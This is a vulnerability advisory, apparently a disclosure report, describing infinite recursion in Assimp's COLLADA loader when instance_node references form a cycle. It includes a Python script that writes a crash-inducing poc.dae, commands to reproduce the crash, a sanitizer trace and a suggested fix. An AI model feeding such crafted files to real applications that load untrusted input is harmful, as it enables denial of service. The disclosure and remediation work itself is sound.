Stack overflow via circular instance_node references in COLLADA files (BuildHierarchy)

## Summary

A stack overflow caused by infinite recursion in `ColladaLoader::BuildHierarchy()` allows denial of service (and potential code execution) when Assimp processes a COLLADA file with circular `<instance_node>` references.

## Tested Version

- Latest release: v6.0.4
- Latest master: commit `158da575` (April 6, 2026)
- Both are vulnerable.

## Details

`ColladaLoader::BuildHierarchy()` in `code/AssetLib/Collada/ColladaLoader.cpp` recursively constructs the scene graph. At line 254, it calls `ResolveNodeInstances()` (line 290) to follow `<instance_node>` references, then at line 269 it recursively calls `BuildHierarchy()` for each resolved instance. Neither function tracks visited nodes.

If a COLLADA file contains circular references (e.g., nodeA → nodeB → nodeA), the recursion never terminates:

```cpp
// Line 254: resolve instance_node references
ResolveNodeInstances(pParser, pNode, instances);
// ...
// Line 269: recurse into each resolved instance — no cycle detection
node->mChildren[...] = BuildHierarchy(pParser, instances[a]);
```

This is distinct from the `ReadAnimation` recursion bug (separate advisory). This crash occurs during scene graph construction, after XML parsing completes successfully.

## PoC
1. Run the generator script to create the PoC:

```python
import os

OUT = os.path.dirname(os.path.abspath(__file__))


def make_collada_circular_instance():
    """Circular instance_node references: nodeA -> nodeB -> nodeA."""
    xml = '<?xml version="1.0"?>\n'
    xml += '<COLLADA xmlns="http://www.collada.org/2005/11/COLLADASchema" version="1.4.1">\n'
    xml += '<library_nodes>\n'
    xml += '  <node id="nodeA" name="A" type="NODE">\n'
    xml += '    <instance_node url="#nodeB"/>\n'
    xml += '  </node>\n'
    xml += '  <node id="nodeB" name="B" type="NODE">\n'
    xml += '    <instance_node url="#nodeA"/>\n'
    xml += '  </node>\n'
    xml += '</library_nodes>\n'
    xml += '<library_visual_scenes>\n'
    xml += '  <visual_scene id="scene">\n'
    xml += '    <node id="root" type="NODE">\n'
    xml += '      <instance_node url="#nodeA"/>\n'
    xml += '    </node>\n'
    xml += '  </visual_scene>\n'
    xml += '</library_visual_scenes>\n'
    xml += '<scene><instance_visual_scene url="#scene"/></scene>\n'
    xml += '</COLLADA>\n'

    out_path = os.path.join(OUT, "poc.dae")
    with open(out_path, "wb") as f:
        f.write(xml.encode())
    print(f"Written {len(xml)} bytes to {out_path}")


if __name__ == "__main__":
    make_collada_circular_instance()
```
   
The visual scene's root references `nodeA`, triggering the infinite recursion.

2. Feed `poc.dae` to any application that uses Assimp to import COLLADA files.

```bash
# Option A: Build the CLI tool (no sanitizer — crashes as SIGSEGV)
cmake -B build -DASSIMP_BUILD_ASSIMP_TOOLS=ON -DASSIMP_BUILD_TESTS=OFF
cmake --build build -j$(nproc)
./build/bin/assimp info poc.dae     # → Segmentation fault

# Option B: Build with ASan for a cleaner trace
cmake -B build-asan -DCMAKE_C_FLAGS="-fsanitize=address" -DCMAKE_CXX_FLAGS="-fsanitize=address" \
      -DASSIMP_BUILD_ASSIMP_TOOLS=ON -DASSIMP_BUILD_TESTS=OFF
cmake --build build-asan -j$(nproc)
./build-asan/bin/assimp info poc.dae  # → AddressSanitizer: stack-overflow
```

No special build configuration is required. With AddressSanitizer enabled, the crash is:

```
==6==ERROR: AddressSanitizer: stack-overflow on address 0x7ffde9a979f8
   #15 0x...3bb in Assimp::ColladaLoader::ResolveNodeInstances(...)
               ColladaLoader.cpp:290:47
   #16 0x...bb4 in Assimp::ColladaLoader::BuildHierarchy(...)
               ColladaLoader.cpp:254:5
   #17 0x...e17 in Assimp::ColladaLoader::BuildHierarchy(...)
               ColladaLoader.cpp:269:56
   #18 0x...e17 in Assimp::ColladaLoader::BuildHierarchy(...)
               ColladaLoader.cpp:269:56
   (... infinite recursion between BuildHierarchy and ResolveNodeInstances ...)
```

## Impact

Denial of Service. Any application using Assimp to load untrusted COLLADA files can be crashed with a tiny (544-byte) input file. Stack overflows may also be exploitable for arbitrary code execution.

## Remediation

Maintain a visited-node set in `BuildHierarchy()` and return a parse error when a cycle is detected. Alternatively, enforce a maximum recursion depth.
